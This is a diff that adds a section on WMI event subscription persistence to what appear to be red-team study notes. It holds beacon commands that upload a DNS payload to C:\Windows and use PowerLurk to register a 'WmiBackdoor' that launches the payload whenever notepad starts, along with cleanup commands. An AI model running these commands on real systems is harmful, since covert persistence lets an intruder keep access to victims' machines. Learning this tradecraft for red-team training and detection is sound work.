@@ -42,3 +42,28 @@ This will create a new service in a STOPPED state, but with the START_TYPE set t
 This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection.
 
 Use connect localhost 4444 to connect to the beacon.
+
+## WMI Subscription
+
+WMI is used to administrate computer, we need three variables
+
+-   EventConsumer: Action to perfom
+-   EventFilter: Trigger 
+-   FilterToConsumerBinding: Binfing trigger with action
+
+
+[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) is a PowerShell tool for building these WMI events. 
+
+In this example, I will upload a DNS payload into the Windows directory, import PowerLurk.ps1 and create a new WMI event subscription that will execute it whenever notepad is started.
+
+```
+beacon> cd C:\Windows
+beacon> upload C:\Payloads\dns_x64.exe
+beacon> powershell-import C:\Tools\PowerLurk.ps1
+beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+```
+
+
+You can view these classes afterwards using `Get-WmiEvent -Name WmiBackdoor`.  The _CommandLineTemplate_ for the EventConsumer will simply be `C:\Windows\dns_x64.exe`; and query for the EventFilter will be `SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'`.
+
+The backdoor can be removed with `Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject`.
